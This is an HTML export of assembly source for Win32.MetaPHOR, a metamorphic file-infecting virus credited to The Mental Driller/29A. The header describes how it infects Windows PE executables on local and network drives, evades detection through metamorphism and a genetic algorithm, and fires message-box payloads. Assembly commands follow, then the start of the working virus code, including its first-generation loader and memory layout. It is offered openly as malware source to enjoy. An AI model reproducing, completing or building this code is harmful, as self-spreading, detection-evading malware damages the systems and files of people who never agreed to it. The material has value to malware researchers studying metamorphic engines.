<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;; ----------------------                                                    ;;</span><span class="sc0">
</span><span class="sc1">;; * Win32.MetaPHOR v1B *                                                    ;;</span><span class="sc0">
</span><span class="sc1">;; ----------------------                                                    ;;</span><span class="sc0">
</span><span class="sc1">;;                                                                           ;;</span><span class="sc0">
</span><span class="sc1">;; Metamorphic Permutating High-Obfuscating Reassembler                      ;;</span><span class="sc0">
</span><span class="sc1">;;                                                                           ;;</span><span class="sc0">
</span><span class="sc1">;;                                           Coded by The Mental Driller/29A ;;</span><span class="sc0">
</span><span class="sc1">;;                                                                           ;;</span><span class="sc0">
</span><span class="sc1">;;                                                                           ;;</span><span class="sc0">
</span><span class="sc1">;; I proudly present my very first metamorphic virus (in its version 1.1).   ;;</span><span class="sc0">
</span><span class="sc1">;;                                                                           ;;</span><span class="sc0">
</span><span class="sc1">;; This virus is only code. No tables, no indirect jumps, etc. etc. It       ;;</span><span class="sc0">
</span><span class="sc1">;; doesn't uses the stack to construct strings, executable code or data:     ;;</span><span class="sc0">
</span><span class="sc1">;; what I do is a reservation of 3'5 Mb of data (more or less) with          ;;</span><span class="sc0">
</span><span class="sc1">;; VirtualAlloc and then use the decryptor to copy the decrypted virus there ;;</span><span class="sc0">
</span><span class="sc1">;; (or unencrypted, since it has a probability of 1/16 of being unencrypted, ;;</span><span class="sc0">
</span><span class="sc1">;; so the decryptor in that cases is in fact a copy routine). The reserved   ;;</span><span class="sc0">
</span><span class="sc1">;; memory is organized in sections (as if it were a PE) where I do all the   ;;</span><span class="sc0">
</span><span class="sc1">;; operations. VirtualAlloc will be retrieved by the decryptor if it's not   ;;</span><span class="sc0">
</span><span class="sc1">;; imported by the host, and the host must import GetModuleHandleA/W and     ;;</span><span class="sc0">
</span><span class="sc1">;; GetProcAddress to be infected. This functions will be used by the virus   ;;</span><span class="sc0">
</span><span class="sc1">;; to get the needed APIs.                                                   ;;</span><span class="sc0">
</span><span class="sc1">;;                                                                           ;;</span><span class="sc0">
</span><span class="sc1">;; The type of metamorphism followed is what I call the "accordion model":   ;;</span><span class="sc0">
</span><span class="sc1">;; disassembly/depermutation -&gt; shrinking -&gt; permutation -&gt; expansion -&gt;     ;;</span><span class="sc0">
</span><span class="sc1">;; -&gt; reassembly, so the code can be bigger or smaller than the previous     ;;</span><span class="sc0">
</span><span class="sc1">;; generation.                                                               ;;</span><span class="sc0">
</span><span class="sc1">;;                                                                           ;;</span><span class="sc0">
</span><span class="sc1">;; The metamorphism in this virus is complete: even the result of the        ;;</span><span class="sc0">
</span><span class="sc1">;; shrinking can't be used for detection, because is different in every      ;;</span><span class="sc0">
</span><span class="sc1">;; generation. That's the point where I introduce a new concept: dimensions  ;;</span><span class="sc0">
</span><span class="sc1">;; in recoding (I mean, code that only get shrinked on two or more           ;;</span><span class="sc0">
</span><span class="sc1">;; generations, but not in the immediate following; this would be the        ;;</span><span class="sc0">
</span><span class="sc1">;; "third" dimension). This makes the disassembly to have always a different ;;</span><span class="sc0">
</span><span class="sc1">;; shape from generation to generation, but, when stabilized, never growing  ;;</span><span class="sc0">
</span><span class="sc1">;; uncontrolablely.                                                          ;;</span><span class="sc0">
</span><span class="sc1">;;                                                                           ;;</span><span class="sc0">
</span><span class="sc1">;; I have added a genetic algorithm in certain parts of the code to make it  ;;</span><span class="sc0">
</span><span class="sc1">;; evolve to the best shape (the one that evades more detections, the action ;;</span><span class="sc0">
</span><span class="sc1">;; more stealthy, etc. etc.). It's a simple algorithm based on weights, so   ;;</span><span class="sc0">
</span><span class="sc1">;; don't expect artificial intelligence :) (well, maybe in the future :P).   ;;</span><span class="sc0">
</span><span class="sc1">;;                                                                           ;;</span><span class="sc0">
</span><span class="sc1">;; I tried to comment the code as cleanly as possible, but well... :)        ;;</span><span class="sc0">
</span><span class="sc1">;;                                                                           ;;</span><span class="sc0">
</span><span class="sc1">;; If the code isn't optimized (in fact, it's NOT optimized), it's because:  ;;</span><span class="sc0">
</span><span class="sc1">;;                                                                           ;;</span><span class="sc0">
</span><span class="sc1">;; 1) It's more clear to see the code that the internal engine will deal     ;;</span><span class="sc0">
</span><span class="sc1">;;  with (for example, many times I use SUB ECX,1 instead of DEC ECX,        ;;</span><span class="sc0">
</span><span class="sc1">;;  although the disassembler can deal with both opcodes).                   ;;</span><span class="sc0">
</span><span class="sc1">;; 2) What's the point for optimizing the code when in next generation it    ;;</span><span class="sc0">
</span><span class="sc1">;;  will be completely unoptimized/garbled? :)                               ;;</span><span class="sc0">
</span><span class="sc1">;; 3) The obfuscation in next generations is bigger (MUCH bigger).           ;;</span><span class="sc0">
</span><span class="sc1">;;                                                                           ;;</span><span class="sc0">
</span><span class="sc1">;;                                                                           ;;</span><span class="sc0">
</span><span class="sc1">;;  General sheet of characteristics:                                        ;;</span><span class="sc0">
</span><span class="sc1">;;                                                                           ;;</span><span class="sc0">
</span><span class="sc1">;;    Name of the virus.............: MetaPHOR v1.0                          ;;</span><span class="sc0">
</span><span class="sc1">;;    Author........................: The Mental Driller / 29A               ;;</span><span class="sc0">
</span><span class="sc1">;;    Size..........................: On 1st generation: 32828 bytes         ;;</span><span class="sc0">
</span><span class="sc1">;;                                    On next ones: variable, but not less   ;;</span><span class="sc0">
</span><span class="sc1">;;                                                  than 64 Kb               ;;</span><span class="sc0">
</span><span class="sc1">;;    Targets.......................: Win32 PE EXEs, supporting three types  ;;</span><span class="sc0">
</span><span class="sc1">;;                                    of infection: mid-infection (when      ;;</span><span class="sc0">
</span><span class="sc1">;;                                    .reloc is present), at last section    ;;</span><span class="sc0">
</span><span class="sc1">;;                                    but using the padding space between    ;;</span><span class="sc0">
</span><span class="sc1">;;                                    sections to store the decrytor/mover,  ;;</span><span class="sc0">
</span><span class="sc1">;;                                    or all at last section.                ;;</span><span class="sc0">
</span><span class="sc1">;;                                    It infects EXEs with a 50% of prob. in ;;</span><span class="sc0">
</span><span class="sc1">;;                                    current directory and going up the     ;;</span><span class="sc0">
</span><span class="sc1">;;                                    directory three by three levels. It    ;;</span><span class="sc0">
</span><span class="sc1">;;                                    also retrieves the drive strings on    ;;</span><span class="sc0">
</span><span class="sc1">;;                                    the system and makes the same if they  ;;</span><span class="sc0">
</span><span class="sc1">;;                                    are fixed or network drives.           ;;</span><span class="sc0">
</span><span class="sc1">;;                                    It uses EPO patching ExitProcess.      ;;</span><span class="sc0">
</span><span class="sc1">;;    Stealth action................: It doesn't enter in directories that   ;;</span><span class="sc0">
</span><span class="sc1">;;                                    begin with 'W' (avoiding the windows   ;;</span><span class="sc0">
</span><span class="sc1">;;                                    directory) and doesn't infect files    ;;</span><span class="sc0">
</span><span class="sc1">;;                                    with a 'V' in the name or beginning    ;;</span><span class="sc0">
</span><span class="sc1">;;                                    with the letters 'PA', 'F-', 'SC',     ;;</span><span class="sc0">
</span><span class="sc1">;;                                    'DR' or 'NO'.                          ;;</span><span class="sc0">
</span><span class="sc1">;;                                    Genetic algorithm in the selection of  ;;</span><span class="sc0">
</span><span class="sc1">;;                                    the infection methods, the creation of ;;</span><span class="sc0">
</span><span class="sc1">;;                                    of the decryptor and some more things  ;;</span><span class="sc0">
</span><span class="sc1">;;                                    to make it more resistant or more      ;;</span><span class="sc0">
</span><span class="sc1">;;                                    difficult to detect due to "evolution".;;</span><span class="sc0">
</span><span class="sc1">;;    Encrypted.....................: Sometimes not.                         ;;</span><span class="sc0">
</span><span class="sc1">;;    Polymorphic...................: Yes                                    ;;</span><span class="sc0">
</span><span class="sc1">;;    Metamorphic...................: Yes                                    ;;</span><span class="sc0">
</span><span class="sc1">;;    Payloads......................: 1) A message box on 17h March, June,   ;;</span><span class="sc0">
</span><span class="sc1">;;                                      September and December with a        ;;</span><span class="sc0">
</span><span class="sc1">;;                                      metamorphic message :).              ;;</span><span class="sc0">
</span><span class="sc1">;;                                    2) On 14h May and on hebrew systems it ;;</span><span class="sc0">
</span><span class="sc1">;;                                      displays a messagebox with the text: ;;</span><span class="sc0">
</span><span class="sc1">;;                                      "Free Palestine!"                    ;;</span><span class="sc0">
</span><span class="sc1">;;    Anti-debugging................: Implicit                               ;;</span><span class="sc0">
</span><span class="sc1">;;    Release history...............:                                        ;;</span><span class="sc0">
</span><span class="sc1">;;           v1.0:  11-02-2002 (I just finished commenting the source code   ;;</span><span class="sc0">
</span><span class="sc1">;;                              and correcting the bugs I found doing that). ;;</span><span class="sc0">
</span><span class="sc1">;;           v1.1:  14-02-2002                                               ;;</span><span class="sc0">
</span><span class="sc1">;;                                                                           ;;</span><span class="sc0">
</span><span class="sc1">;;                                                                           ;;</span><span class="sc0">
</span><span class="sc1">;; To do in next versions:                                                   ;;</span><span class="sc0">
</span><span class="sc1">;;                                                                           ;;</span><span class="sc0">
</span><span class="sc1">;; 1) ELF infection: I only have to add APIs and call one or another         ;;</span><span class="sc0">
</span><span class="sc1">;;   depending on the operating system, and add the ELF infection algorithm. ;;</span><span class="sc0">
</span><span class="sc1">;; 2) Reassembly for different processors: IA64, Alpha, PowerPC, etc. I only ;;</span><span class="sc0">
</span><span class="sc1">;;   have to code a new disassembler/reassembler, since for every internal   ;;</span><span class="sc0">
</span><span class="sc1">;;   operation I use a self-defined pseudo-assembler with its own opcodes.   ;;</span><span class="sc0">
</span><span class="sc1">;; 3) Plug-in injector                                                       ;;</span><span class="sc0">
</span><span class="sc1">;; 4) More things (of course!! :).                                           ;;</span><span class="sc0">
</span><span class="sc1">;;                                                                           ;;</span><span class="sc0">
</span><span class="sc1">;;                                                                           ;;</span><span class="sc0">
</span><span class="sc1">;; My thanks comes to:                                                       ;;</span><span class="sc0">
</span><span class="sc1">;;   29A, of course.                                                         ;;</span><span class="sc0">
</span><span class="sc1">;;   Vecna &amp; Z0MBiE for being pioneers in the field of metamorphism. I thank ;;</span><span class="sc0">
</span><span class="sc1">;;     Vecna his interest by this virus and his suggestions. Of course, I    ;;</span><span class="sc0">
</span><span class="sc1">;;     never took them in account :P (acaso te dije como tenias que hacer    ;;</span><span class="sc0">
</span><span class="sc1">;;     el Lexo32, boludin asqueroso??? :P :P :P :P ;D)                       ;;</span><span class="sc0">
</span><span class="sc1">;;   Eden Kirin, the author of ConTEXT (editor for programmers). It would be ;;</span><span class="sc0">
</span><span class="sc1">;;     a hell to make a source like this one with EDIT :).                   ;;</span><span class="sc0">
</span><span class="sc1">;;   The opressed people in the world.                                       ;;</span><span class="sc0">
</span><span class="sc1">;;                                                                           ;;</span><span class="sc0">
</span><span class="sc1">;;                                                                           ;;</span><span class="sc0">
</span><span class="sc1">;; Also big thanks to Trent Reznor and NIN by their music, which inspired    ;;</span><span class="sc0">
</span><span class="sc1">;;  me greatly while coding this, specially the Halo 14 (commonly known as   ;;</span><span class="sc0">
</span><span class="sc1">;;  "The Fragile"). From the lyrics of "Somewhat damaged", a quote that      ;;</span><span class="sc0">
</span><span class="sc1">;;  resumes quite well the feeling of this code:                             ;;</span><span class="sc0">
</span><span class="sc1">;;                                                                           ;;</span><span class="sc0">
</span><span class="sc1">;;  "how could I ever think it's funny how                                   ;;</span><span class="sc0">
</span><span class="sc1">;;   everything that swore it wouldn't change is different now..."           ;;</span><span class="sc0">
</span><span class="sc1">;;                                                                           ;;</span><span class="sc0">
</span><span class="sc1">;; Well, in the song it doesn't have that meaning, but it does when you      ;;</span><span class="sc0">
</span><span class="sc1">;;  quote it alone heading this code :).                                     ;;</span><span class="sc0">
</span><span class="sc1">;;                                                                           ;;</span><span class="sc0">
</span><span class="sc1">;; And a big "FUCK YOU" to fascists, whatever the flag or religion they use  ;;</span><span class="sc0">
</span><span class="sc1">;; to hide themselves behind, the country they live/represent and the moral  ;;</span><span class="sc0">
</span><span class="sc1">;; reasons they say to justify their actions (for both attack and revenge):  ;;</span><span class="sc0">
</span><span class="sc1">;; all them have the same inferior mind that makes them to think like        ;;</span><span class="sc0">
</span><span class="sc1">;; animals.                                                                  ;;</span><span class="sc0">
</span><span class="sc1">;;                                                                           ;;</span><span class="sc0">
</span><span class="sc1">;;                                                                           ;;</span><span class="sc0">
</span><span class="sc1">;; OK, so here's the proggy. Enjoy it as much as I enjoyed doing it.         ;;</span><span class="sc0">
</span><span class="sc1">;;                                                                           ;;</span><span class="sc0">
</span><span class="sc1">;; To assemble:                                                              ;;</span><span class="sc0">
</span><span class="sc1">;;    TASM32 /m29A /ml MetaPHOR.asm                                          ;;</span><span class="sc0">
</span><span class="sc1">;;    TLINK32 -Tpe -aa -x MetaPHOR.obj,,,kernel32.lib                        ;;</span><span class="sc0">
</span><span class="sc1">;;                                                                           ;;</span><span class="sc0">
</span><span class="sc1">;;    No need of making PEWRSEC!                                             ;;</span><span class="sc0">
</span><span class="sc1">;;                                                                           ;;</span><span class="sc0">
</span><span class="sc1">;;                                                                           ;;</span><span class="sc0">
</span><span class="sc1">;; Quick reference (keyword search):                                         ;;</span><span class="sc0">
</span><span class="sc1">;;                                                                           ;;</span><span class="sc0">
</span><span class="sc1">;;    Variable declaration........................: Key_!VarDeclr            ;;</span><span class="sc0">
</span><span class="sc1">;;    Beginning of virus..........................: Key_!VirusStart          ;;</span><span class="sc0">
</span><span class="sc1">;;    Disassembler................................: Key_!Disassembler        ;;</span><span class="sc0">
</span><span class="sc1">;;    Shrinker....................................: Key_!Shrinker            ;;</span><span class="sc0">
</span><span class="sc1">;;    Variable identificator......................: Key_!VarIdent            ;;</span><span class="sc0">
</span><span class="sc1">;;    Permutator..................................: Key_!Permutator          ;;</span><span class="sc0">
</span><span class="sc1">;;    Expander....................................: Key_!Xpander             ;;</span><span class="sc0">
</span><span class="sc1">;;    Reassembler.................................: Key_!Assembler           ;;</span><span class="sc0">
</span><span class="sc1">;;    Infection code..............................: Key_!Infector            ;;</span><span class="sc0">
</span><span class="sc1">;;    Decryptor maker.............................: Key_!MakePoly            ;;</span><span class="sc0">
</span><span class="sc1">;;                                                                           ;;</span><span class="sc0">
</span><span class="sc1">;;                                                                           ;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc2">.386p</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">
</span><span class="sc5">locals</span><span class="sc0">

</span><span class="sc9">.code</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">   </span><span class="sc1">; All code in DATA section. TASM allow this and we</span><span class="sc0">
</span><span class="sc9">.data</span><span class="sc0">                 </span><span class="sc1">; don't need to activate the write flag after assembling</span><span class="sc0">
                      </span><span class="sc1">; the code.</span><span class="sc0">

</span><span class="sc5">AddressToFree</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">VirtualAlloc</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">VirtualFree</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">        </span><span class="sc1">; First generation imports</span><span class="sc0">


</span><span class="sc1">;; This code (PreMain) only exists at first generation.</span><span class="sc0">
</span><span class="sc1">;; PreMain is a loader of the virus in the same way an infected host will</span><span class="sc0">
</span><span class="sc1">;; load it.</span><span class="sc0">
</span><span class="sc5">PreMain</span><span class="sc0">         </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">1000h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">340000h</span><span class="sc0">     </span><span class="sc1">; Reserve 340000h bytes (~ 3.4Mb)</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">VirtualAlloc</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Error</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; Set delta of reserved memory</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">AddressToFree</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Main</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EndOfCode</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Main</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">         </span><span class="sc1">; Copy virus</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">__DISASM2_SECTION</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">__DATA_SECTION</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">__BUFFERS_SECTION</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">__DISASM_SECTION</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">__CODE_SECTION</span><span class="sc0">     </span><span class="sc1">; Push section addresses</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; Push needed APIs</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">5</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc1">; Bit 0=0: 'A', 1:'W' for GetModuleHandle</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">             </span><span class="sc1">; Call MetaPHOR!</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0C000h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">AddressToFree</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">VirtualFree</span><span class="sc0">    </span><span class="sc1">; This isn't needed at all, since where</span><span class="sc0">
                              </span><span class="sc1">; our process is destroyed all the virtual memory</span><span class="sc0">
                              </span><span class="sc1">; allocated by it is deallocated automatically.</span><span class="sc0">
      </span><span class="sc5">@@Error</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc0">
</span><span class="sc5">PreMain</span><span class="sc0">         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Now we are executing in the reserved memory</span><span class="sc0">

</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; ATTENTION: LEAs loading offsets of variables are problematic (due to the</span><span class="sc0">
</span><span class="sc1">;; variable identificator) so, in the cases like string constructors and</span><span class="sc0">
</span><span class="sc1">;; getting info from FindFirst and FindNext the operations will be performed</span><span class="sc0">
</span><span class="sc1">;; directly into memory sections, to avoid them getting marked as variables.</span><span class="sc0">

</span><span class="sc1">;; In the entrance, the polymorphic loader/decryptor must pass the next data:</span><span class="sc0">
</span><span class="sc1">;;; DeltaReg --&gt; Initialized (in this case, EBP)</span><span class="sc0">
</span><span class="sc1">;;;</span><span class="sc0">
</span><span class="sc1">;;; In reverse-push order (C-like):</span><span class="sc0">
</span><span class="sc1">;;;     * (Number of register used for Delta SHL 1) AND (A/W flag for</span><span class="sc0">
</span><span class="sc1">;;          GetModuleHandleA/W)</span><span class="sc0">
</span><span class="sc1">;;;     * Address to GetModuleHandle in import table</span><span class="sc0">
</span><span class="sc1">;;;     * Address to GetProcAddress in import table</span><span class="sc0">
</span><span class="sc1">;;;     * Offset of CODE_SECTION</span><span class="sc0">
</span><span class="sc1">;;;     * Offset of DISASM_SECTION</span><span class="sc0">
</span><span class="sc1">;;;     * Offset of BUFFERS_SECTION</span><span class="sc0">
</span><span class="sc1">;;;     * Offset of DATA_SECTION</span><span class="sc0">
</span><span class="sc1">;;;     * Offset of DISASM2_SECTION</span><span class="sc0">
</span><span class="sc1">;;;</span><span class="sc0">
</span><span class="sc1">;;; All data passed is local to the engine, I mean, it can be modified (and</span><span class="sc0">
</span><span class="sc1">;;; in fact it will be modified) during the reassembly. In this way we don't</span><span class="sc0">
</span><span class="sc1">;;; have even the variables in a fixed delta location, although even keeping</span><span class="sc0">
</span><span class="sc1">;;; fixed section offsets the variables are relocated.</span><span class="sc0">

</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">

</span><span class="sc1">;; KEYWORD: Key_!VarDeclr</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;;;************************************************************************;;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; Memory addresses. The variables are internal offsets into the data section,</span><span class="sc0">
</span><span class="sc1">;; so they are coded in this way. As you can see, all them are EQUs.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;; There are also some equates to make easier the programming, although all</span><span class="sc0">
</span><span class="sc1">;; the values here are only valid on first generation, due to the fact that</span><span class="sc0">
</span><span class="sc1">;; they'll recalculated and randomized.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc5">__CODE_SECTION</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">000000h</span><span class="sc0">
</span><span class="sc5">__DISASM_SECTION</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">100000h</span><span class="sc0">
</span><span class="sc5">__BUFFERS_SECTION</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">080000h</span><span class="sc0">
</span><span class="sc5">__LABEL_SECTION</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__BUFFERS_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">00000h</span><span class="sc0">
</span><span class="sc5">__VARIABLE_SECTION</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__BUFFERS_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10000h</span><span class="sc0">
</span><span class="sc5">__BUFFER1_SECTION</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__BUFFERS_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">20000h</span><span class="sc0">
</span><span class="sc5">__BUFFER2_SECTION</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__BUFFERS_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">30000h</span><span class="sc0">
</span><span class="sc5">__VAR_MARKS_SECTION</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__BUFFERS_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">40000h</span><span class="sc0">
</span><span class="sc5">__DATA_SECTION</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">0E0000h</span><span class="sc0">
</span><span class="sc5">__DISASM2_SECTION</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">200000h</span><span class="sc0">

</span><span class="sc5">NumberOfLabels</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">NumberOfInstructions</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0008h</span><span class="sc0">
</span><span class="sc5">InstructionTable</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0010h</span><span class="sc0">
</span><span class="sc5">LabelTable</span><span class="sc0">              </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0018h</span><span class="sc0">
</span><span class="sc5">FutureLabelTable</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0020h</span><span class="sc0">
</span><span class="sc5">PathMarksTable</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0028h</span><span class="sc0">
</span><span class="sc5">NumberOfLabelsPost</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc5">__DATA_SECTION</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0030h</span><span class="sc0">
